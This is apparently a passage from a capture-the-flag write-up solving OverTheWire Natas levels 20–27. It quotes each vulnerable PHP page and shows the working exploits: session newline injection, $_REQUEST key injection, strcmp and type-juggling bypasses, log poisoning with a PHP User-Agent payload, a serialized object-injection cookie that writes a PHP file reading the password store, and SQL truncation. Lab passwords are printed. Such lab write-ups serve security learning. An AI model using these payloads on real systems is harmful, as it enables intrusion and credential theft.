    }
}


/* we don't need this */
function myopen($path, $name) { 
    //debug("MYOPEN $path $name"); 
    return true; 
}

/* we don't need this */
function myclose() { 
    //debug("MYCLOSE"); 
    return true; 
}

function myread($sid) { 
    debug("MYREAD $sid"); 
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID"); 
        return "";
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    if(!file_exists($filename)) {
        debug("Session file doesn't exist");
        return "";
    }
    debug("Reading from ". $filename);
    $data = file_get_contents($filename);
    $_SESSION = array();
    foreach(explode("\n", $data) as $line) {
        debug("Read [$line]");
    $parts = explode(" ", $line, 2);
    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
    }
    return session_encode();
}

function mywrite($sid, $data) { 
    // $data contains the serialized version of $_SESSION
    // but our encoding is better
    debug("MYWRITE $sid $data"); 
    // make sure the sid is alnum only!!
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID"); 
        return;
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    $data = "";
    debug("Saving in ". $filename);
    ksort($_SESSION);
    foreach($_SESSION as $key => $value) {
        debug("$key => $value");
        $data .= "$key $value\n";
    }
    file_put_contents($filename, $data);
    chmod($filename, 0600);
}

/* we don't need this */
function mydestroy($sid) {
    //debug("MYDESTROY $sid"); 
    return true; 
}
/* we don't need this */
function mygarbage($t) { 
    //debug("MYGARBAGE $t"); 
    return true; 
}

session_set_save_handler(
    "myopen", 
    "myclose", 
    "myread", 
    "mywrite", 
    "mydestroy", 
    "mygarbage");
session_start();

if(array_key_exists("name", $_REQUEST)) {
    $_SESSION["name"] = $_REQUEST["name"];
    debug("Name set to " . $_REQUEST["name"]);
}

print_credentials();

$name = "";
if(array_key_exists("name", $_SESSION)) {
    $name = $_SESSION["name"];
}

?> 
```

This is similar to the previous challenges, we still need the $_SESSION array to contain a key named *admin* with the value of 1. The code writes the session data to a file and that is where it will read the session ID from (the name of the file is the session ID). First, let's look at the debug output when we change our name: http://natas20.natas.labs.overthewire.org/index.php?name=admin&debug

``` plain
DEBUG: MYREAD sjj8g13u1f3ueiogqdfgf3jin1 // debug("MYREAD $sid"); 
DEBUG: Reading from /var/lib/php5/mysess_sjj8g13u1f3ueiogqdfgf3jin1 // debug("Reading from ". $filename);
DEBUG: Read [name admin] // debug("Read [$line]");
DEBUG: Read [] // debug("Read [$line]");
DEBUG: Name set to admin // debug("Name set to " . $_REQUEST["name"]);

DEBUG: MYWRITE sjj8g13u1f3ueiogqdfgf3jin1 name|s:5:"admin"; // debug("MYWRITE $sid $data"); 
DEBUG: Saving in /var/lib/php5/mysess_sjj8g13u1f3ueiogqdfgf3jin1 // debug("Saving in ". $filename);
DEBUG: name => admin // debug("$key => $value");
```

I placed the corresponding PHP code to the same line with the output for convenience. Now to analyze the relevant code:

* **function mywrite($sid, $data)** - after checking that the session ID contains alphanumeric characters only, it sets the path where the session data will be used. The file looks like *mysess_SID*, see in the output above. Then it sorts the $_SESSION array by its keys and iterates over the array as key => value. In my example, you can see from the output <code>name => admin</code> that *name* is the key and *admin* is the value. Then the key and value are written to the file as follows: <code>$data .= "$key $value\n";</code>. So the data will look like this: *name admin* followed by a newline.

* **function myread($sid)** - this function reads the data from the file and breaks the string into an array, split by the delimiter, which in this case is the newline. Then the key and value are separated by a space. Basically, this reads what was written earlier in the file

We want to focus on the *mywrite* function because that's the actual code that writes the data that we passed to the server. And the code that needs our attention is this:

``` php
foreach($_SESSION as $key => $value) {
        debug("$key => $value");
        $data .= "$key $value\n"; 
```

We know that to get the password for the next level, the $_SESSION array has to contain a key / value pair of *admin => 1*. And the *mywrite* function does the writing of this data for us..so all we need is to find a way to inject it. But if you look at how data is written to the file, you will notice the newline delimiter...what if we can inject another key / value pair after our initial input? We currently have this: *name => admin* by entering *admin* in the form. But if we add a newline character we can then insert a new key / value pair that matches the expectations of the server in order to give us the password. So what we want to inject is <code>admin\nadmin 1</code>. And then the session data would look like this:

``` plain
name admin
admin 1
```

Since we need to URL encode the carriage return and space, the injection looks like this: <code>admin%0dadmin%201</code>. So I passed it to the URL like this: natas20.natas.labs.overthewire.org/index.php?debug&name=admin%0Aadmin%201 and here's the output:

``` plain
DEBUG: MYREAD sjj8g13u1f3ueiogqdfgf3jin1
DEBUG: Reading from /var/lib/php5/mysess_sjj8g13u1f3ueiogqdfgf3jin1
DEBUG: Read [name admin]
DEBUG: Read [admin 1]
DEBUG: Read []
DEBUG: Name set to admin admin 1
You are an admin. The credentials for the next level are:

Username: natas21
Password: IFekPyrQXftziDEsUr3x21sYuahypdgJ

DEBUG: MYWRITE sjj8g13u1f3ueiogqdfgf3jin1 name|s:13:"admin admin 1";admin|s:1:"1";
DEBUG: Saving in /var/lib/php5/mysess_sjj8g13u1f3ueiogqdfgf3jin1
DEBUG: admin => 1
DEBUG: name => admin admin 1
```

And we successfully acquired the next password: <code>IFekPyrQXftziDEsUr3x21sYuahypdgJ</code>

### Level 21

{% img center /images/overthewire/natas/natas21.png 'natas21' 'natas 21' %}

We need to satisfy the same requirements as before to get next password:

``` php
<?

function print_credentials() { 
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas22\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.";
    }
}


session_start();
print_credentials();

?> 
```

{% img center /images/overthewire/natas/natas21css.png 'natas21css' 'natas 21css' %}

This page allows you to play with some CSS values. Also the session ID for this page is different than the other one.


``` php
<?  

session_start();

// if update was submitted, store it
if(array_key_exists("submit", $_REQUEST)) {
    foreach($_REQUEST as $key => $val) {
    $_SESSION[$key] = $val;
    }
}

if(array_key_exists("debug", $_GET)) {
    print "[DEBUG] Session contents:<br>";
    print_r($_SESSION);
}

// only allow these keys
$validkeys = array("align" => "center", "fontsize" => "100%", "bgcolor" => "yellow");
$form = "";

$form .= '<form action="index.php" method="POST">';
foreach($validkeys as $key => $defval) {
    $val = $defval;
    if(array_key_exists($key, $_SESSION)) {
    $val = $_SESSION[$key];
    } else {
    $_SESSION[$key] = $val;
    }
    $form .= "$key: <input name='$key' value='$val' /><br>";
}
$form .= '<input type="submit" name="submit" value="Update" />';
$form .= '</form>';

$style = "background-color: ".$_SESSION["bgcolor"]."; text-align: ".$_SESSION["align"]."; font-size: ".$_SESSION["fontsize"].";";
$example = "<div style='$style'>Hello world!</div>";

?> 
```

If you turn on debug, you can see the contents of the $_SESSION array:

``` plain
[DEBUG] Session contents:
Array ( [align] => center [fontsize] => 100% [bgcolor] => blue [submit] => Update ) 
```

Again we want to insert the pair *admin => 1* in the array, but the code only allows those 3 keys, so we can't POST what we want. But if we look at this code:

``` php
// if update was submitted, store it
if(array_key_exists("submit", $_REQUEST)) {
    foreach($_REQUEST as $key => $val) {
    $_SESSION[$key] = $val;
    }
}
```

As long as the key *submit* exists in the $_REQUEST array, it will take the key / value pairs in the $_REQUEST array and set them in the $_SESSION array. This is exactly what we want! But we can't POST our values because of the validity checks. Reading through the PHP manual I saw this:

> $_REQUEST — An associative array that by default contains the contents of $_GET, $_POST and $_COOKIE. 

> The variables in $_REQUEST are provided to the script via the GET, POST, and COOKIE input mechanisms and therefore could be modified by the remote
> user and cannot be trusted.

Well, we have control of what gets passed to $_REQUEST, and the code inserts whatever we give it as long as the key *submit* exists. Instead of POST'ing, I modified the HTML using Firebug to:

``` html
bgcolor:
<input value="1" name="admin">
```

On the CSS page a new session ID was issued: <code>4nhuf71ckmm80osqvn1s8s8bd6</code>. I pasted it in the session ID of the page that should give us credentials and refreshed:

``` plain
You are an admin. The credentials for the next level are:

Username: natas22
Password: chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ
```

### Level 22

{% img center /images/overthewire/natas/natas22.png 'natas22' 'natas 22' %}

Pretty blank, eh? Let's look at the code:

``` php

<?
session_start();

if(array_key_exists("revelio", $_GET)) {
    // only admins can reveal the password
    if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {
    header("Location: /");
    }
}
?> 

<?
    if(array_key_exists("revelio", $_GET)) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas23\n";
    print "Password: <censored></pre>";
    }
?> 
```

Well, it looks like all you have to do is pass a GET parameter named *revelio* and receive the password. But if you're not an admin, you will just be redirected to the same page via a Location header. I couldn't think of a way to fool the page that I'm admin, but I tried messing with the headers,URL and session ID, with no success. However, when I just decided to look at the response to my request in Burp, the answer was in the HTML:

``` plain
You are an admin. The credentials for the next level are:<br><pre>Username: natas23
Password: D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE</pre>
```

After receiving this response the browser made another request..but at this point it didn't matter :D


### Level 23

{% img center /images/overthewire/natas/natas23.png 'natas23' 'natas 23' %}

Here we have to input a password to login. Let's see the code:

``` plain
<?php
    if(array_key_exists("passwd",$_REQUEST)){
        if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas24 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
    // morla / 10111
?>  
```

We will get the credentials if we enter a password that contains the string *iloveyou* and that is larger than 10. But how can a string be compared to an integer? PHP manual to the rescue! According to the [Comparison Operators](https://secure.php.net/manual/en/language.operators.comparison.php) section:

> If you compare a number with a string or the comparison involves numerical strings, then each string is converted to a number and the comparison 
> performed numerically.

[So how is the string converted to a number?](https://secure.php.net/manual/en/language.types.string.php#language.types.string.conversion)

> If the string does not contain any of the characters '.', 'e', or 'E' and the numeric value fits into integer type limits (as defined by 
> PHP_INT_MAX), the string will be evaluated as an integer. In all other cases it will be evaluated as a float.  

> The value is given by the initial portion of the string. If the string starts with valid numeric data, this will be the value used. Otherwise, the
> value will be 0 (zero).

So all we have to do is enter a password that starts with a number greater than 50, followed by the *iloveyou* string, something like *50iloveyou*:

``` plain
The credentials for the next level are:

Username: natas24 Password: OsRmXFguozKpTZZ5X14zNO43379LZveg
```

// (I thought at the beginning that the comment was related to the challenge, but it turns out that's the handle of the creator of the challenge).



### Level 24

{% img center /images/overthewire/natas/natas23.png 'natas24' 'natas 24' %}

``` php
<?php
    if(array_key_exists("passwd",$_REQUEST)){
        if(!strcmp($_REQUEST["passwd"],"<censored>")){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas25 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
    // morla / 10111
?>  
```

This level is centered around exploiting the *strcmp* function. This function takes 2 strings as arguments and performs a case sensitive, binary safe string comparison:

``` plain
int strcmp ( string $str1 , string $str2 )
Returns < 0 if str1 is less than str2; > 0 if str1 is greater than str2, and 0 if they are equal. 
```



When reading the user contributed notes in the manual, I noticed the mention of the necessity for both parameters to be strings, otherwise the return values would be unexpected, especially if given something like an array. Then I searched for some more information about the subject, check [Chaotic Security blog](http://turbochaos.blogspot.jp/2013/08/exploiting-exotic-bugs-php-type-juggling.html) and the [OWASP PHP security cheatsheet](https://www.owasp.org/index.php/PHP_Security_Cheat_Sheet). If you pass an array to the function, it will return NULL, and PHP will treat it as a 0, hence fooling the code that you provided the correct password. So I did it like this: http://natas24.natas.labs.overthewire.org/?passwd[]=pwn

``` plain
Warning: strcmp() expects parameter 1 to be string, array given in /var/www/natas/natas24/index.php on line 23

The credentials for the next level are:

Username: natas25 Password: GHF6X7YwACaYYssHVY05cFq83hRktl4c
```

### Level 25

{% img center /images/overthewire/natas/natas25.png 'natas25' 'natas 25' %}

Here we have a page with a quote that we can choose to view in English or German.

``` php
<?php
    // cheers and <3 to malvina
    // - morla

    function setLanguage(){
        /* language setup */
        if(array_key_exists("lang",$_REQUEST))
            if(safeinclude("language/" . $_REQUEST["lang"] ))
                return 1;
        safeinclude("language/en"); 
    }
    
    function safeinclude($filename){
        // check for directory traversal
        if(strstr($filename,"../")){
            logRequest("Directory traversal attempt! fixing request.");
            $filename=str_replace("../","",$filename);
        }
        // dont let ppl steal our passwords
        if(strstr($filename,"natas_webpass")){
            logRequest("Illegal file access detected! Aborting!");
            exit(-1);
        }
        // add more checks...

        if (file_exists($filename)) { 
            include($filename);
            return 1;
        }
        return 0;
    }
    
    function listFiles($path){
        $listoffiles=array();
        if ($handle = opendir($path))
            while (false !== ($file = readdir($handle)))
                if ($file != "." && $file != "..")
                    $listoffiles[]=$file;
        
        closedir($handle);
        return $listoffiles;
    } 
    
    function logRequest($message){
        $log="[". date("d.m.Y H::i:s",time()) ."]";
        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
        $log=$log . " \"" . $message ."\"\n"; 
        $fd=fopen("/tmp/natas25_" . session_id() .".log","a");
        fwrite($fd,$log);
        fclose($fd);
    }
?>
```

At first it would seem that we have to find a way to traverse to <code>/etc/natas_webpass</code> and read the password from there, however there is a check in the code to prevent us from going there. So I next looked at bypassing the LFI filter and played a bit in a PHP sandbox to see which injection would work against the filter. Finally, I was able to read the log file with this injection: <code>lang=....//....//....//....//....//tmp/natas25_6n8g6cuqkbuthmp8usvql1vej2.log</code> 

``` plain
[17.10.2015 14::02:27] Mozilla/5.0 (X11; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/40.0 "Directory traversal attempt! fixing request." [17.10.2015 14::02:38] Mozilla/5.0 (X11; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/40.0 "Directory traversal attempt! fixing request."
Notice: Undefined variable: __GREETING in /var/www/natas/natas25/index.php on line 80

Notice: Undefined variable: __MSG in /var/www/natas/natas25/index.php on line 81

Notice: Undefined variable: __FOOTER in /var/www/natas/natas25/index.php on line 82
```

Excellent, now we're getting somewhere! The next technique we'll use to get the password is a log poisoning attack. Read more [here](http://hackerforhire.com.au/apache-log-poisoning-with-local-file-inclusion/) 

If you look at the *logRequest* function you will see that it appends various information to a log file. Part of this information is under our control (the User Agent). By using the log poisoning attack, we can change the User Agent to some PHP code of our choosing, that will then get written to the log file when we do an action which should be logged. And when the server reads the log file, it will happily execute the code contained within. Let's see this in practice:

* I changed my user agent to <code><?php readfile('/etc/natas_webpass/natas26'); ?></code>

* Then I refreshed the page where I was looking at the log file and among all the logged information was also the password:

``` plain
"Directory traversal attempt! fixing request." [17.10.2015 15::56:48] oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T 
```

The password is <code>oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T</code>


### Level 26

{% img center /images/overthewire/natas/natas26.png 'natas26' 'natas 26' %}

Source code:

``` php
<?php
    // sry, this is ugly as hell.
    // cheers kaliman ;)
    // - morla
    
    class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;
      
        function __construct($file){
            // initialise variables
            $this->initMsg="#--session started--#\n";
            $this->exitMsg="#--session end--#\n";
            $this->logFile = "/tmp/natas26_" . $file . ".log";
      
            // write initial message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$initMsg);
            fclose($fd);
        }                       
      
        function log($msg){
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$msg."\n");
            fclose($fd);
        }                       
      
        function __destruct(){
            // write exit message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->exitMsg);
            fclose($fd);
        }                       
    }
 
    function showImage($filename){
        if(file_exists($filename))
            echo "<img src=\"$filename\">";
    }

    function drawImage($filename){
        $img=imagecreatetruecolor(400,300);
        drawFromUserdata($img);
        imagepng($img,$filename);     
        imagedestroy($img);
    }
    
    function drawFromUserdata($img){
        if( array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
        
            $color=imagecolorallocate($img,0xff,0x12,0x1c);
            imageline($img,$_GET["x1"], $_GET["y1"], 
                            $_GET["x2"], $_GET["y2"], $color);
        }
        
        if (array_key_exists("drawing", $_COOKIE)){
            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
            if($drawing)
                foreach($drawing as $object)
                    if( array_key_exists("x1", $object) && 
                        array_key_exists("y1", $object) &&
                        array_key_exists("x2", $object) && 
                        array_key_exists("y2", $object)){
                    
                        $color=imagecolorallocate($img,0xff,0x12,0x1c);
                        imageline($img,$object["x1"],$object["y1"],
                                $object["x2"] ,$object["y2"] ,$color);
            
                    }
        }    
    }
    
    function storeData(){
        $new_object=array();

        if(array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
            $new_object["x1"]=$_GET["x1"];
            $new_object["y1"]=$_GET["y1"];
            $new_object["x2"]=$_GET["x2"];
            $new_object["y2"]=$_GET["y2"];
        }
        
        if (array_key_exists("drawing", $_COOKIE)){
            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
        }
        else{
            // create new array
            $drawing=array();
        }
        
        $drawing[]=$new_object;
        setcookie("drawing",base64_encode(serialize($drawing)));
    }
?>

<?php
    session_start();

    if (array_key_exists("drawing", $_COOKIE) ||
        (   array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET))){  
        $imgfile="img/natas26_" . session_id() .".png"; 
        drawImage($imgfile); 
        showImage($imgfile);
        storeData();
    }
    
?>

```

Code looks complicated so I'm breaking it down in little pieces:

* We have a Logger class that writes some messages to a log file

* the *showImage()* function sets the image tag source to the given filename, if that file exists

* the *drawImage()* function creates an image and outputs it to the browser

* *drawFromUserdata()* uses the user-supplied coordinates to draw lines across the image

* *storeData()* populates an array with the 4 $_GET parameters and sets a cookie named *drawing* to contain the serialized and base64 encoded value of the previously created array

So far, out of ideas, but when reading about *unserialize()* in the PHP manual, there was a security warning:

> Warning

> Do not pass untrusted user input to unserialize(). Unserialization can result in code being loaded and executed due to object instantiation and 
> autoloading, and a malicious user may be able to exploit this. Use a safe, standard data interchange format such as JSON (via json_decode() and 
> json_encode()) if you need to pass serialized data to the user.

Next I proceeded to read more about exploiting PHP unserialization, and there were quite a few resources available, so I must be on the right track :D And this also explained the existence of the Logger class, which isn't instantiated anywhere in the program. But first, we must understand what serialization is all about.

* *string serialize ( mixed $value )*

* Generates a storable representation of a value. This is useful for storing or passing PHP values around without losing their type and structure. Returns a binary string containing a byte-stream representation of value that can be stored anywhere. 

**Serialization** is the conversion of a PHP data structure to a string that can be passed to external applications, such as databases, or stored in files etc. 

**Unserialization** converts the string back to a PHP value

Now let's look at what OWASP says about the PHP object injection attack:

> The vulnerability occurs when user-supplied input is not properly sanitized before being passed to the unserialize() PHP function. Since PHP 
> allows object serialization, attackers could pass ad-hoc serialized strings to a vulnerable unserialize() call, resulting in an arbitrary PHP 
> object(s) injection into the application scope.

> In order to successfully exploit a PHP Object Injection vulnerability two conditions must be met:

> The application must have a class which implements a PHP magic method (such as __wakeup or __destruct) that can be used to carry out malicious 
> attacks, or to start a "POP chain".

> All of the classes used during the attack must be declared when the vulnerable unserialize() is being called, otherwise object autoloading must be
> supported for such classes.

Well, we can exploit this because both conditions apply to our case! Remember that we have the Logger class,  and it contains a *__construct()* and *__destruct()* magic method. So the class wasn't just lying around for nothing in the code, hehehe!

Before continuing, I want to show an [example of serialization](http://www.w3resource.com/php/function-reference/serialize.php), so you can have an idea of what it looks like with an easier to understand example than deciphering the *drawing* cookie:

``` php
    <?php  
    $serialized_data = serialize(array('Math', 'Language', 'Science'));  
    echo  $serialized_data . '<br>';  
    ?>  
```

And the output is <code>a:3:{i:0;s:4:"Math";i:1;s:8:"Language";i:2;s:7:"Science";}</code>. Ugh, looks complicated! But here it is:

* a = array, 3 = the number of elements in the array 

* i = integer, 0 = index in the array, s = string, 4 = length of the string, Math is the element value, and this continues for the other elements as well

Now, to exploit this. We have:

* a way to inject our own code into the application (by changing the *drawing* cookie that will get unserialized)

* a way to write to a file (leverage the Logger class)

* a way to read a file (we can browse to where images are stored inside *img/*)

First, I made my own malicious Logger class:

``` php
<?php
class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;
      
        function __construct(){
            // initialise variables
            $this->initMsg="pwn";
            $this->exitMsg= "<?php echo readfile('/etc/natas_webpass/natas27');?>";
            $this->logFile = "img/pass.php";
        }                                            
      
        function __destruct(){
            // write exit message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->exitMsg);
            fclose($fd);
        }                       
    }
$myobj = new Logger();
echo base64_encode(serialize($myobj));
?>
```

This code I wrote and tested on my local machine, first with local files, to see that it behaves as I want it to. When that was done, I used PHP to serialize and base64 encode it, so I can paste it in the cookie, and this is how it looks like:

* serialized:

``` plain
O:6:"Logger":3:{s:15:"LoggerlogFile";s:12:"img/pass.php";s:15:"LoggerinitMsg";s:3:"pwn";s:15:"LoggerexitMsg";s:52:"<?php echo readfile('/etc/natas_webpass/natas27');?>";}
```

* base64 encoded: 

``` plain
Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxMjoiaW1nL3Bhc3MucGhwIjtzOjE1OiIATG9nZ2VyAGluaXRNc2ciO3M6MzoicHduIjtzOjE1OiIATG9nZ2VyAGV4aXRNc2ciO3M6NTI6Ijw/cGhwIGVjaG8gcmVhZGZpbGUoJy9ldGMvbmF0YXNfd2VicGFzcy9uYXRhczI3Jyk7Pz4iO30=
```

In my Logger class I just removed what wasn't necessary from the original code, and made the modifications so that the script will create a PHP file inside the *img/* directory, with this code inside it:

``` php
<?php echo readfile('/etc/natas_webpass/natas27');?>
```

And after changing the cookie and navigating to pass.php, the code gets executed and spits the password: <code>55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ</code>

Because I used *readfile()*, I actually saw the password followed by a space and 33 (the length of read data). I looked in the PHP manual and noticed saw that *file_get_contents()* is a better choice for reading a file into a string, but I was too lazy to change it!

> file_get_contents() is the preferred way to read the contents of a file into a string. 

 
Helpful resources:

[PHP serialization](https://stackoverflow.com/questions/8641889/how-to-use-php-serialize-and-unserialize)

[OWASP PHP Object Injection](https://www.owasp.org/index.php/PHP_Object_Injection)

[RCE with PHP unserialize](https://www.notsosecure.com/2015/09/24/remote-code-execution-via-php-unserialize/)

[PHP object injection](https://vagosec.org/2013/09/wordpress-php-object-injection/)

[unserialize() exploitation](https://www.owasp.org/images/9/9e/Utilizing-Code-Reuse-Or-Return-Oriented-Programming-In-PHP-Application-Exploits.pdf)


### Level 27        
    
{% img center /images/overthewire/natas/natas14.png 'natas27' 'natas 27' %}


``` php
<?

// morla / 10111
// database gets cleared every 5 min


/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/ 

function checkCredentials($link,$usr,$pass){
 
    $user=mysql_real_escape_string($usr);
    $password=mysql_real_escape_string($pass);
    
    $query = "SELECT username from users where username='$user' and password='$password' ";
    $res = mysql_query($query, $link);
    if(mysql_num_rows($res) > 0){
        return True;
    }
    return False;
} 

function validUser($link,$usr){
    
    $user=mysql_real_escape_string($usr);
    
    $query = "SELECT * from users where username='$user'";
    $res = mysql_query($query, $link);
    if($res) {
        if(mysql_num_rows($res) > 0) {
            return True;
        }
    }
    return False;
} 

function dumpData($link,$usr){
    
    $user=mysql_real_escape_string($usr);
    
    $query = "SELECT * from users where username='$user'";
    $res = mysql_query($query, $link);
    if($res) {
        if(mysql_num_rows($res) > 0) {
            while ($row = mysql_fetch_assoc($res)) {
                //thanks to Gobo for reporting this bug!
                //return print_r($row);
                return print_r($row,true);
            }
        }
    }
    return False;
} 

function createUser($link, $usr, $pass){

    $user=mysql_real_escape_string($usr);
    $password=mysql_real_escape_string($pass);
    
    $query = "INSERT INTO users (username,password) values ('$user','$password')";
    $res = mysql_query($query, $link);
    if(mysql_affected_rows() > 0){
        return True;
    }
    return False;
} 

if(array_key_exists("username", $_REQUEST) and array_key_exists("password", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas27', '<censored>');
    mysql_select_db('natas27', $link);
   

    if(validUser($link,$_REQUEST["username"])) {
        //user exists, check creds
        if(checkCredentials($link,$_REQUEST["username"],$_REQUEST["password"])){
            echo "Welcome " . htmlentities($_REQUEST["username"]) . "!<br>";
            echo "Here is your data:<br>";
            $data=dumpData($link,$_REQUEST["username"]);
            print htmlentities($data);
        }
        else{
            echo "Wrong password for user: " . htmlentities($_REQUEST["username"]) . "<br>";
        }        
    } 
    else {
        //user doesn't exist
        if(createUser($link,$_REQUEST["username"],$_REQUEST["password"])){ 
            echo "User " . htmlentities($_REQUEST["username"]) . " was created!";
        }
    }

    mysql_close($link);
} else {
?>
```

Before digging in the code, I just tested the functionality of the login system..you can create a user and then view its username and password values. After logging in, you will see something like this:

``` plain
 Welcome haxor!
Here is your data:
Array ( [username] => haxor [password] => doge ) 
```

I then tried to create a natas28 user to see what would happen...and surprise!

``` plain
Wrong password for user: natas28
```

This tells us that there is indeed such a user in the database and that our random password doesn't match the one stored in the database..so that's what we want to get! I've tried some SQLi, but got nothing. So back to reading PHP code it is! (ugh)


* *checkCredentials()* checks if the provided username and password (which are both escaped) exist in the table, returning True if they are

* *validUser()* checks if the username is already in the table

* *dumpData()* prints the data about the array containing the username and password as seen above in the log in message

* *createUser()* inserts a new username-password pair in the table

The important part of the rest of the code is that it looks up the username in the table, creating it if it doesn't exist, and proceeding with the credentials check and data printing if it already exists. After reading about the functions in the PHP manual I still had no idea how to continue. At this point, noticing the flow of the code was helpful:

1) when giving a username that already exists, it continues to the credentials checking part

2) if credential check is successful, the welcome message and credentials data are printed (without any other action from the user)

Judging from the above lines of reasoning, I thought that the interesting function that I might need to check again is the *dumpData()* one (because it returns data from the database, so it's possible to find out about the natas18 user from it). Still no idea how to do that though, but another thing I noticed is how important the username is for the code: all the checks and actions revolve around it, and it was also possible to determine the existence of the natas18 user because of that. So, at this point, I thought the next part should be to convince the code to dump the data for natas18. 

I next thought about creating a username of natas18 followed by many spaces, exceeding the 64 character limit. The code still returned wrong password, so all the spaces must be trimmed. I made a string in Python to check what really happens:

``` python
user = 'natas28' + ' ' * 64 + 'end'
print user
'natas28                                                                end'
```

And I stopped inputting a password, because the code created users irrespective if they had passwords, and I could log in as an existing user with a blank password, as can be seen from this test dummy:

``` plain
Welcome yo!
Here is your data:
Array ( [username] => yo [password] => ) 
```

Now I tried to create a user with that long string and yeah, the space is removed:

``` plain
User natas28 end was created!
```

However, when next I tried to log in just as natas28 with no password, here is what awaited me!

``` plain
Welcome natas28!
Here is your data:
Array ( [username] => natas28 [password] => JWwR438wkgTsNKBbcJoowyysdM82YjeF ) 
```

Why was this possible? Remember the flow of the code when you try to log in: 

``` plain
validUser() 
	if user exists, checkCredentials()
		if yay here is your data
		if nay wrong password message
	else createUser()
```

To confirm it, I used [sqlfiddle](http://sqlfiddle.com/) to generate a database and queries that mimic the PHP code.

First, table creation:

``` sql
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
); 
```

Then, inserting the natas28 user with the password (I used a dummy one but assume it's the one we're after):

``` sql
INSERT INTO users (username,password) values ('natas28','omgpass');
```

Next, the querying for the username as it happens in the validUser() function:

``` sql
SELECT * from users where username='natas28';
```

And the result:

{% img center /images/overthewire/natas/sqlfiddle.png 'sqlfiddle' 'sqlfiddle' %}

When trying to insert the long string next I received a data truncation error because it was larger than the allowed 64 characters, so I manually adjusted it to natas28 + 57 spaces:

``` plain
'natas28                                                         '
```

Then I added it to the table:

``` sql
INSERT INTO users (username,password) values ('natas28                                                         ', '');
```

And when querying the database both are returned (with the first being the original natas28 user):

{% img center /images/overthewire/natas/sqlfiddle2.png 'sqlfiddle2' 'sqlfiddle2' %}

To summarize:

``` plain
# with input of 'natas28                                                                end'
validUser() 
	long string is truncated to natas28 end, which doesn't exist in the table
createUser()
	# input becomes 'natas28                                                         '
	the value that is inserted in the table is truncated to the max length, in this case natas28 + 57 spaces
# now check again with username of natas28 and no password
validUser() 
	username already exists, so checkCredentials()
	with the space trimming, the code returns both the original and my inserted username, as seen on sqlfiddle (but due to the PHP code, we only get the first row, which is fine, because that's the one we care about
```

Password is <code>JWwR438wkgTsNKBbcJoowyysdM82YjeF</code>

### Level 28

And it's finished for now! Awesome challenge!

{% img center /images/overthewire/natas/gz.png 'gz' 'gz' %}

``` plain
 ___________________________________
< You will triumph over your enemy. >
 -----------------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||

```
